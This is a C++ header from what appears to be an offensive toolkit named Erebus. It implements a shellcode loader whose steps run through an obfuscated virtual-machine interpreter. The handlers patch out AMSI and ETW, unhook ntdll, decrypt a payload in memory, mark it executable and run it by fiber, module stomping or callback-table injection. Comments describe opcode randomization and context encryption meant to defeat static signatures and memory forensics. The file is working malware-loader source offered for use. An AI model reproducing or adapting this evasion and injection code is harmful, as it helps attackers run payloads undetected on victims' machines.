/*
 * Erebus.VMLoader - vmloader.hpp
 *
 * RISC VM-based shellcode loader built on vmkit.
 *
 * OPSEC surface:
 *   The entire loader call chain (evasion patches, sleep obfuscation,
 *   memory allocation, payload write, decryption, RX flip, fiber exec)
 *   is decomposed into 8 fixed-size IR opcodes and driven through a
 *   256-entry constexpr dispatch table.  Static analysis sees a VM
 *   interpreter loop rather than a sequential loader pipeline.
 *
 * Three orthogonal obfuscation layers (all opt-in via vmkit::DefaultConfig):
 *   1. Opcode randomization  - the bytecode alphabet is a random permutation;
 *      signatures based on opcode byte sequences are invalidated per-build.
 *   2. Bytecode XOR at rest  - the IR blob is XOR-encrypted with a seed-
 *      derived 32-byte key; the loader decrypts once before the dispatch loop.
 *   3. Per-op context encryption - VMLoaderContext (region pointers, payload
 *      ptr) is XOR-scrambled between each opcode; memory dumps captured
 *      between ops show ciphertext instead of live allocation addresses.
 *
 * Opcode set:
 *   EvasionPatch(0)    - RunEvasionPatches(): unhook ntdll, init syscall
 *                        stubs, patch AMSI + ETW.  MUST be op[0]: all
 *                        subsequent NT handlers rely on GetSyscallStub.
 *   ObfuscatedSleep(1) - ObfuscatedDwell(base_ms, jitter_ms)
 *   AllocRegion(2)     - NtAllocateVirtualMemory(self, RW)
 *   WritePayload(3)    - copy payload bytes from ctx.payload_data
 *   DecryptPayload(4)  - XOR-decrypt in-place with seed-derived key
 *   ProtectRX(5)       - NtProtectVirtualMemory(PAGE_EXECUTE_READ)
 *   ExecPayload(6)     - self-injection dispatch via CONFIG_INJECTION_TYPE:
 *                          2 (default) = fiber, 6 = module stomp, 7 = KCT
 *   FreeRegion(7)      - NtFreeVirtualMemory cleanup
 *
 * Operand layout per op:
 *   EvasionPatch:    -
 *   ObfuscatedSleep: u32[0]=base_ms  u32[1]=jitter_ms
 *   AllocRegion:     u32[0]=region   u64[0]=size
 *   WritePayload:    u32[0]=region   u32[1]=size    u64[0]=src_off
 *   DecryptPayload:  u32[0]=region   u32[1]=seed    u64[0]=size
 *   ProtectRX:       u32[0]=region   u64[0]=size
 *   ExecPayload:     u32[0]=region   u64[0]=size
 *   FreeRegion:      u32[0]=region
 *
 * Build config macros (set via Makefile -D flags, filled by builder.py):
 *   VM_IR_SEED       - 32-bit seed for key derivation (default: 0xC0DE1337)
 *   VM_REVERSE_MAP   - 256-byte opcode reverse map (see Makefile/builder)
 */

#pragma once

#include "vm_loader.hpp"

// Erebus infrastructure (headers from ../Erebus.Loader/include via -I)
#include "loader.hpp"
#include "evasion/syscall_backend.hpp"
#include "evasion/evasion.hpp"
#include "evasion/sleep_obfuscation.hpp"
#include "config.hpp"

#include <cstring>  // memcpy
#include <windows.h>

// -----------------------------------------------------------------------
// Build-time config
// -----------------------------------------------------------------------

#ifndef VM_IR_SEED
#define VM_IR_SEED 0xC0DE1337U
#endif

// -----------------------------------------------------------------------
// Opcode enumeration
// -----------------------------------------------------------------------

enum class ErebusVMOp : std::uint8_t {
    EvasionPatch    = 0,
    ObfuscatedSleep = 1,
    AllocRegion     = 2,
    WritePayload    = 3,
    DecryptPayload  = 4,
    ProtectRX       = 5,
    ExecPayload     = 6,   // dispatches to CONFIG_INJECTION_TYPE: 2=fiber, 6=stomp, 7=KCT
    FreeRegion      = 7,
};

// -----------------------------------------------------------------------
// VM mutable context
// -----------------------------------------------------------------------

struct VMLoaderContext {
    void*          regions[8]    = {};       // NtAllocateVirtualMemory results
    const uint8_t* payload_data  = nullptr;  // g_vm_payload from embedded.h
    std::size_t    payload_size  = 0;        // total payload bytes
};

// -----------------------------------------------------------------------
// Key derivation - must match vmloader_builder.cpp exactly.
// Both sides derive the same 32-byte key from the same seed.
// -----------------------------------------------------------------------

static inline std::array<std::uint8_t, 32>
vm_derive_key(std::uint32_t seed) noexcept {
    std::array<std::uint8_t, 32> key{};
    constexpr std::uint8_t base[6] = {'e', 'r', 'e', 'b', 'u', 's'};
    for (std::size_t i = 0; i < key.size(); ++i)
        key[i] = static_cast<std::uint8_t>(
            base[i % 6] + (seed & 0xFF) + i * 17u);
    return key;
}

// -----------------------------------------------------------------------
// Forward declarations for ExecPayload injection dispatch targets.
// Only the selected type is compiled in; others are dead code eliminated.
// -----------------------------------------------------------------------

namespace erebus {
#if CONFIG_INJECTION_TYPE == 6
    VOID InjectionModuleStomp(BYTE*, SIZE_T, HANDLE, HANDLE);
#elif CONFIG_INJECTION_TYPE == 7
    VOID InjectionKernelCallback(BYTE*, SIZE_T, HANDLE, HANDLE);
#endif
} // namespace erebus

// -----------------------------------------------------------------------
// Handler specializations
// -----------------------------------------------------------------------
// NOTE: EvasionPatch MUST be the first op in any IR program.
// It calls RunEvasionPatches() which initialises the syscall stub page
// (InitIndirectSyscalls).  All subsequent handlers use GetSyscallStub;
// calling them before EvasionPatch will fall back to GetProcAddressC.
// -----------------------------------------------------------------------

template <>
struct vmkit::Handler<ErebusVMOp::EvasionPatch> {
    static void execute(VMLoaderContext& /*ctx*/,
                        const vmkit::Op<ErebusVMOp>& /*op*/) noexcept {
        erebus::evasion::RunEvasionPatches();
    }
};

template <>
struct vmkit::Handler<ErebusVMOp::ObfuscatedSleep> {
    static void execute(VMLoaderContext& /*ctx*/,
                        const vmkit::Op<ErebusVMOp>& op) noexcept {
#if CONFIG_SLEEP_OBFUSCATION_TYPE > 0
        erebus::evasion::ObfuscatedDwell(op.u32[0], op.u32[1]);
#else
        (void)op;
#endif
    }
};

template <>
struct vmkit::Handler<ErebusVMOp::AllocRegion> {
    static void execute(VMLoaderContext& ctx,
                        const vmkit::Op<ErebusVMOp>& op) noexcept {
        const std::uint32_t region_id = op.u32[0];
        if (region_id >= 8) return;

        HMODULE hnt = erebus::GetModuleHandleC(H("ntdll.dll"));
        typeNtAllocateVirtualMemory NtAllocateVirtualMemory =
            (typeNtAllocateVirtualMemory)
            erebus::evasion::GetSyscallStub(H("NtAllocateVirtualMemory"));
        if (!NtAllocateVirtualMemory && hnt)
            NtAllocateVirtualMemory = (typeNtAllocateVirtualMemory)
                erebus::GetProcAddressC(hnt, H("NtAllocateVirtualMemory"));
        if (!NtAllocateVirtualMemory) return;

        PVOID  base  = nullptr;
        SIZE_T size  = static_cast<SIZE_T>(op.u64[0]);
        NtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size,
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        ctx.regions[region_id] = base;
    }
};

template <>
struct vmkit::Handler<ErebusVMOp::WritePayload> {
    static void execute(VMLoaderContext& ctx,
                        const vmkit::Op<ErebusVMOp>& op) noexcept {
        const std::uint32_t region_id = op.u32[0];
        const std::uint32_t size      = op.u32[1];
        const std::uint64_t src_off   = op.u64[0];
        if (region_id >= 8 || !ctx.regions[region_id]) return;
        if (!ctx.payload_data || src_off + size > ctx.payload_size) return;
        std::memcpy(ctx.regions[region_id], ctx.payload_data + src_off, size);
    }
};

template <>
struct vmkit::Handler<ErebusVMOp::DecryptPayload> {
    static void execute(VMLoaderContext& ctx,
                        const vmkit::Op<ErebusVMOp>& op) noexcept {
        const std::uint32_t region_id = op.u32[0];
        const std::uint32_t seed      = op.u32[1];
        const std::size_t   size      = static_cast<std::size_t>(op.u64[0]);
        if (region_id >= 8 || !ctx.regions[region_id]) return;

        const auto key = vm_derive_key(seed);
        vmkit::xor_codec::apply(
            std::span<std::uint8_t>(
                static_cast<std::uint8_t*>(ctx.regions[region_id]), size),
            std::span<const std::uint8_t>(key));
    }
};

template <>
struct vmkit::Handler<ErebusVMOp::ProtectRX> {
    static void execute(VMLoaderContext& ctx,
                        const vmkit::Op<ErebusVMOp>& op) noexcept {
        const std::uint32_t region_id = op.u32[0];
        const SIZE_T        size      = static_cast<SIZE_T>(op.u64[0]);
        if (region_id >= 8 || !ctx.regions[region_id]) return;

        HMODULE hnt = erebus::GetModuleHandleC(H("ntdll.dll"));
        typeNtProtectVirtualMemory NtProtectVirtualMemory =
            (typeNtProtectVirtualMemory)
            erebus::evasion::GetSyscallStub(H("NtProtectVirtualMemory"));
        if (!NtProtectVirtualMemory && hnt)
            NtProtectVirtualMemory = (typeNtProtectVirtualMemory)
                erebus::GetProcAddressC(hnt, H("NtProtectVirtualMemory"));
        if (!NtProtectVirtualMemory) return;

        PVOID  base      = ctx.regions[region_id];
        SIZE_T sz        = size;
        ULONG  old_prot  = 0;
        NtProtectVirtualMemory(NtCurrentProcess(), &base, &sz,
                               PAGE_EXECUTE_READ, &old_prot);
    }
};

template <>
struct vmkit::Handler<ErebusVMOp::ExecPayload> {
    static void execute(VMLoaderContext& ctx,
                        const vmkit::Op<ErebusVMOp>& op) noexcept {
        const std::uint32_t region_id = op.u32[0];
        const SIZE_T        sc_size   = static_cast<SIZE_T>(op.u64[0]);
        if (region_id >= 8 || !ctx.regions[region_id]) return;
        BYTE* sc = static_cast<BYTE*>(ctx.regions[region_id]);

#if CONFIG_INJECTION_TYPE == 6
        erebus::InjectionModuleStomp(sc, sc_size, NtCurrentProcess(), NtCurrentThread());
#elif CONFIG_INJECTION_TYPE == 7
        erebus::InjectionKernelCallback(sc, sc_size, NtCurrentProcess(), NtCurrentThread());
#else
        // Default: type 2 - fiber-based self-injection
        (void)sc; (void)sc_size;
        HMODULE hk32 = erebus::GetModuleHandleC(H("kernel32.dll"));
        if (!hk32) return;

        typedef LPVOID (WINAPI *pfnConvertThreadToFiber)(LPVOID);
        typedef LPVOID (WINAPI *pfnCreateFiber)(SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
        typedef VOID   (WINAPI *pfnSwitchToFiber)(LPVOID);

        auto ConvertThreadToFiber = (pfnConvertThreadToFiber)
            erebus::GetProcAddressC(hk32, H("ConvertThreadToFiber"));
        auto CreateFiber = (pfnCreateFiber)
            erebus::GetProcAddressC(hk32, H("CreateFiber"));
        auto SwitchToFiber = (pfnSwitchToFiber)
            erebus::GetProcAddressC(hk32, H("SwitchToFiber"));

        if (!ConvertThreadToFiber || !CreateFiber || !SwitchToFiber) return;

        ConvertThreadToFiber(nullptr);
        LPVOID fiber = CreateFiber(
            0,
            reinterpret_cast<LPFIBER_START_ROUTINE>(ctx.regions[region_id]),
            nullptr);
        if (fiber) SwitchToFiber(fiber);
#endif
    }
};

template <>
struct vmkit::Handler<ErebusVMOp::FreeRegion> {
    static void execute(VMLoaderContext& ctx,
                        const vmkit::Op<ErebusVMOp>& op) noexcept {
        const std::uint32_t region_id = op.u32[0];
        if (region_id >= 8 || !ctx.regions[region_id]) return;

        HMODULE hnt = erebus::GetModuleHandleC(H("ntdll.dll"));
        typeNtFreeVirtualMemory NtFreeVirtualMemory =
            (typeNtFreeVirtualMemory)
            erebus::evasion::GetSyscallStub(H("NtFreeVirtualMemory"));
        if (!NtFreeVirtualMemory && hnt)
            NtFreeVirtualMemory = (typeNtFreeVirtualMemory)
                erebus::GetProcAddressC(hnt, H("NtFreeVirtualMemory"));
        if (!NtFreeVirtualMemory) return;

        PVOID  base = ctx.regions[region_id];
        SIZE_T sz   = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &base, &sz, MEM_RELEASE);
        ctx.regions[region_id] = nullptr;
    }
};

// -----------------------------------------------------------------------
// VM type alias
// -----------------------------------------------------------------------

using ErebusVMOpcodeList = vmkit::OpcodeList<
    ErebusVMOp::EvasionPatch,
    ErebusVMOp::ObfuscatedSleep,
    ErebusVMOp::AllocRegion,
    ErebusVMOp::WritePayload,
    ErebusVMOp::DecryptPayload,
    ErebusVMOp::ProtectRX,
    ErebusVMOp::ExecPayload,
    ErebusVMOp::FreeRegion
>;

// -----------------------------------------------------------------------
// Loader VM configuration
// -----------------------------------------------------------------------
// Default opcode reverse map (encoded byte → real ErebusVMOp).
// The builder uses the inverse forward map when writing IR bytecode.
// Override at build time by redefining the constexpr array below and
// passing matching -D flags when compiling vmloader_builder.cpp.
//
// Default permutation (fixed; randomise per-build via builder.py):
//   Real → Encoded:  0→7  1→5  2→3  3→1  4→6  5→0  6→2  7→4
//   Encoded → Real:  0→5  1→3  2→6  3→2  4→7  5→1  6→4  7→0
// -----------------------------------------------------------------------

struct LoaderVMConfig : vmkit::DefaultConfig {
    static constexpr bool opcode_randomization      = true;
    static constexpr bool bytecode_xor_encrypted    = true;
    static constexpr bool per_op_context_encryption = true;

    static constexpr vmkit::OpcodeReverseMap opcode_reverse_map = [] {
        vmkit::OpcodeReverseMap m = vmkit::identity_reverse_map();
        // encoded byte → real ErebusVMOp (inverse of forward map in builder)
        m[0] = static_cast<std::uint8_t>(ErebusVMOp::ProtectRX);
        m[1] = static_cast<std::uint8_t>(ErebusVMOp::WritePayload);
        m[2] = static_cast<std::uint8_t>(ErebusVMOp::ExecPayload);
        m[3] = static_cast<std::uint8_t>(ErebusVMOp::AllocRegion);
        m[4] = static_cast<std::uint8_t>(ErebusVMOp::FreeRegion);
        m[5] = static_cast<std::uint8_t>(ErebusVMOp::ObfuscatedSleep);
        m[6] = static_cast<std::uint8_t>(ErebusVMOp::DecryptPayload);
        m[7] = static_cast<std::uint8_t>(ErebusVMOp::EvasionPatch);
        return m;
    }();

    // XOR-decrypt the IR blob with a key derived from the same seed the
    // builder used when encrypting.  Both sides call vm_derive_key(seed).
    static void decrypt_bytecode(std::span<std::uint8_t> blob,
                                 std::uint32_t           seed) noexcept {
        const auto key = vm_derive_key(seed);
        vmkit::xor_codec::apply(blob, std::span<const std::uint8_t>(key));
    }

    // Per-op context encryption: XOR the entire VMLoaderContext as raw
    // bytes with a key derived from seed ^ op_index.  Region pointers are
    // unreadable between ops; memory forensics sees ciphertext.
    template <typename Ctx>
    static void encrypt_context(Ctx& ctx, std::uint32_t op_idx) noexcept {
        const auto key = vm_derive_key(VM_IR_SEED ^ op_idx);
        std::span<std::uint8_t> raw{
            reinterpret_cast<std::uint8_t*>(&ctx), sizeof(ctx)};
        vmkit::xor_codec::apply(raw, std::span<const std::uint8_t>(key));
    }

    template <typename Ctx>
    static void decrypt_context(Ctx& ctx, std::uint32_t op_idx) noexcept {
        encrypt_context(ctx, op_idx); // XOR is its own inverse
    }
};

// Convenience alias for the fully-typed Vm instance.
using ErebusVM = vmkit::Vm<ErebusVMOp, VMLoaderContext,
                           LoaderVMConfig, ErebusVMOpcodeList>;
